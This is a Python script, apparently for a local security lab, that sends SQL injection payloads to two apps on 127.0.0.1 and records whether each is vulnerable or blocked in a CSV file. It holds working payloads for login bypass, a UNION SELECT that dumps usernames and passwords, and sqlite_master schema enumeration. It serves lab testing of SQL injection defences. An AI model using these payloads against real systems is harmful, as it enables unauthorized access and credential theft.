import argparse
import csv
from datetime import datetime, timezone
from html.parser import HTMLParser
from pathlib import Path

import requests

OBJETIVOS = (
    "http://127.0.0.1:5000",
    "http://127.0.0.1:5001",
)
LOGIN_TESTS = (
    ("Login legítimo", "admin", "admin123", False),
    ("Contraseña incorrecta", "admin", "incorrecta", False),
    ("Bypass con comentario", "admin' --", "x", True),
    ("Tautología clásica", "' OR '1'='1' --", "x", True),
)
SEARCH_TESTS = (
    ("Búsqueda legítima", "Laptop", "control"),
    ("Tautología en búsqueda", "' OR 1=1 --", "tautologia"),
    (
        "Extracción de usuarios",
        "' UNION SELECT id, username, password FROM users --",
        "usuarios",
    ),
    (
        "Enumeración de tablas",
        "' UNION SELECT 1, name, sql "
        "FROM sqlite_master WHERE type='table' --",
        "esquema",
    ),
)
class LectorFilas(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.filas = []
        self.actual = None

    def handle_starttag(self, tag, attrs):
        atributos = dict(attrs)
        clases = atributos.get("class", "").split()

        if tag == "tr" and "fila" in clases:
            self.actual = []

    def handle_data(self, data):
        if self.actual is not None:
            self.actual.append(data)

    def handle_endtag(self, tag):
        if tag == "tr" and self.actual is not None:
            self.filas.append(" ".join(self.actual).strip())
            self.actual = None

def extraer_filas(html):
    lector = LectorFilas()
    lector.feed(html)
    return lector.filas

def evaluar_login(respuesta, ataque, usuario, password):
    acceso = (
        respuesta.status_code == 200
        and "Bienvenido" in respuesta.text)
    if ataque:
        if acceso:
            return "VULNERABLE: bypass de credenciales"
        if respuesta.status_code == 401:
            return "BLOQUEADO: credenciales rechazadas"
        return "INCONCLUSO: respuesta inesperada"
    if usuario == "admin" and password == "admin123":
        if acceso:
            return "CONTROL OK: login legítimo"
        return "CONTROL FALLIDO: revisar login o base de datos"
    if respuesta.status_code == 401:
        return "CONTROL OK: contraseña incorrecta rechazada"
    return "CONTROL FALLIDO: rechazo no confirmado"

def evaluar_busqueda(respuesta, tipo):
    if respuesta.status_code != 200:
        return "INCONCLUSO: respuesta inesperada"
    filas = extraer_filas(respuesta.text)
    contenido = "\n".join(filas)
    cantidad = len(filas)
    if tipo == "control":
        if cantidad == 1 and "Laptop" in contenido:
            return "CONTROL OK: producto encontrado"
        return "CONTROL FALLIDO: revisar búsqueda o plantilla"
    if tipo == "tautologia":
        if cantidad >= 5:
            return f"VULNERABLE: {cantidad} filas devueltas"
        if cantidad == 0:
            return "BLOQUEADO: sin resultados"
        return "INCONCLUSO: revisar datos de prueba"
    if tipo == "usuarios" and "admin123" in contenido:
        return "VULNERABLE: contraseña de prueba expuesta"
    if tipo == "esquema" and "CREATE TABLE" in contenido.upper():
        return "VULNERABLE: esquema expuesto"
    if cantidad == 0:
        return "BLOQUEADO: sin resultados"
    return "INCONCLUSO: revisar filas recibidas"

def ejecutar_prueba(cliente, base_url, modulo, caso):
    descripcion = caso[0]
    registro = {
        "fecha_utc": datetime.now(timezone.utc).isoformat(
            timespec="seconds"
        ),
        "objetivo": base_url,
        "modulo": modulo,
        "prueba": descripcion,
        "entrada": "",
        "http": "",
        "resultado": "",
    }
    try:
        if modulo == "login":
            _, usuario, password, ataque = caso
            registro["entrada"] = (
                f"usuario={usuario}; contraseña={password}")
            respuesta = cliente.post(
                f"{base_url}/login",
                data={"username": usuario, "password": password},
                timeout=5,
                allow_redirects=False,)
            registro["http"] = respuesta.status_code
            registro["resultado"] = evaluar_login(
                respuesta, ataque, usuario, password)
        else:
            _, payload, tipo = caso
            registro["entrada"] = payload
            respuesta = cliente.get(
                f"{base_url}/buscar",
                params={"q": payload},
                timeout=5,
                allow_redirects=False,)
            registro["http"] = respuesta.status_code
            registro["resultado"] = evaluar_busqueda(
                respuesta, tipo)
    except requests.RequestException as error:
        registro["resultado"] = (
            f"ERROR DE CONEXIÓN: {type(error).__name__}")
    return registro

def guardar_csv(destino, registros):
    destino.parent.mkdir(parents=True, exist_ok=True)
    with destino.open("w", newline="", encoding="utf-8-sig") as archivo:
        escritor = csv.DictWriter(
            archivo,
            fieldnames=(
                "fecha_utc",
                "objetivo",
                "modulo",
                "prueba",
                "entrada",
                "http",
                "resultado",
            ),
)
        escritor.writeheader()
        escritor.writerows(registros)

def main():
    parser = argparse.ArgumentParser(
        description="Pruebas SQLi exclusivas del laboratorio local.")
    parser.add_argument(
        "--url",
        choices=OBJETIVOS,
        default=OBJETIVOS[0],
        help="Aplicación local que se va a evaluar.",)
    parser.add_argument(
        "--csv",
        type=Path,
        help="Ruta del archivo CSV de resultados.",)
    args = parser.parse_args()
    puerto = args.url.rsplit(":", 1)[1]
    marca = datetime.now().strftime("%Y%m%d_%H%M%S")
    destino = args.csv or (
        Path(__file__).resolve().parent
        / "resultados"
        / f"pruebas_{puerto}_{marca}.csv")

    registros = []

    with requests.Session() as cliente:
        cliente.trust_env = False

        print(f"\nObjetivo: {args.url}")

        for modulo, casos in (
            ("login", LOGIN_TESTS),
            ("busqueda", SEARCH_TESTS),):
            print(f"\n[{modulo.upper()}]")

            for caso in casos:
                registro = ejecutar_prueba(
                    cliente, args.url, modulo, caso)
                registros.append(registro)

                estado = registro["http"] or "-"
                print(
                    f"{registro['prueba']}: "
                    f"HTTP {estado} -> {registro['resultado']}")

    guardar_csv(destino, registros)
    print(f"\nCSV guardado en: {destino.resolve()}")

if __name__ == "__main__":
    main()